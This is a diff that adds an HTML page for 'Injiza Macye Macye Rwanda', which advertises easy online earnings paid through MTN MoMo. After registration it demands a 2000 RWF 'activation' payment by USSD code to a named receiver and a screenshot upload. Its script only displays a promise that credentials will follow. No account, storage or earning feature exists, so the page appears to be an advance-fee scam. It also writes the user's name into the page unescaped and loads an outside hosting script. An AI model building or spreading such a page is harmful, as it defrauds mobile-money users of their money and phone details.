@@ -1,0 +1,151 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Injiza Macye Macye Rwanda</title>
+    <style>
+        /* CSS Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://www.shutterstock.com/shutterstock/videos/1104125133/thumb/2.jpg?ip=x480') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            color: white;
+        }
+        .overlay {
+            background-color: rgba(0, 0, 0, 0.7); /* Dark overlay to improve readability */
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: rgba(255, 255, 255, 0.1); /* Transparent background */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        input[type="text"], input[type="file"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+        button {
+            width: 100%;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .message {
+            text-align: center;
+            margin: 20px 0;
+            color: blue;
+            font-size: 18px;
+        }
+        .hidden {
+            display: none;
+        }
+        .description {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay">
+        <div class="container">
+            <h1>Injiza Macye Macye Rwanda</h1>
+            <div class="description">
+                Welcome to Injiza Macye Macye Rwanda! This is your platform to earn money online easily. Register to get started, activate your account, and begin receiving payments directly through MTN MOMO Pay.
+            </div>
+
+            <div id="register-section">
+                <h2>Register</h2>
+                <form id="registration-form">
+                    <label for="fullname">Full Name:</label>
+                    <input type="text" id="fullname" placeholder="Enter your full name" required>
+
+                    <label for="phone">Mobile Number:</label>
+                    <input type="tel" id="phone" placeholder="Enter your mobile number" required>
+
+                    <label for="mtn">MTN MOMO Pay Number (For Withdrawals):</label>
+                    <input type="tel" id="mtn" placeholder="Enter your MOMO Pay number" required>
+
+                    <button type="button" onclick="register()">Register</button>
+                </form>
+            </div>
+
+            <div id="activation-section" class="hidden">
+                <h2>Account Activation</h2>
+                <div id="welcome-message"></div>
+                <p>Your account is not activated. To activate your account, please pay 2000 RWF via MTN Mobile Money:</p>
+                <p>
+                    <strong>Dial this code:</strong> <br>
+                    <span style="font-size: 18px; font-weight: bold;">*182*8*1*1238484*2000#</span> <br>
+                    <strong>Receiver Name:</strong> pacifique
+                </p>
+                <form id="activation-form">
+                    <label for="payment-phone">Phone Number Used for Payment:</label>
+                    <input type="tel" id="payment-phone" placeholder="Enter the number used in payment" required>
+
+                    <label for="screenshot">Upload Payment Screenshot:</label>
+                    <input type="file" id="screenshot" required>
+
+                    <button type="button" onclick="activate()">Activate Account</button>
+                </form>
+                <div class="message" id="activation-message"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Registration Function
+        function register() {
+            const fullname = document.getElementById('fullname').value;
+            const phone = document.getElementById('phone').value;
+            const mtn = document.getElementById('mtn').value;
+
+            if (fullname && phone && mtn) {
+                document.getElementById('register-section').classList.add('hidden');
+                document.getElementById('activation-section').classList.remove('hidden');
+                document.getElementById('welcome-message').innerHTML = `<p>Hello, <strong>${fullname}</strong></p>`;
+            } else {
+                alert("Please fill out all fields!");
+            }
+        }
+
+        // Activation Function
+        function activate() {
+            const paymentPhone = document.getElementById('payment-phone').value;
+            const screenshot = document.getElementById('screenshot').value;
+
+            if (paymentPhone && screenshot) {
+                document.getElementById('activation-message').innerHTML = 
+                    `Thank you! Your username and password will be sent to <strong>${paymentPhone}</strong> shortly.`;
+            } else {
+                document.getElementById('activation-message').innerHTML = 
+                    "Please complete the form by filling in the payment phone number and uploading the screenshot!";
+            }
+        }
+    </script>
+
+<script src="https://www.drv.tw/inc/wd.js?s=sfcqxxc9ai6vbxm3ksqsaw"></script></body>
+</html>
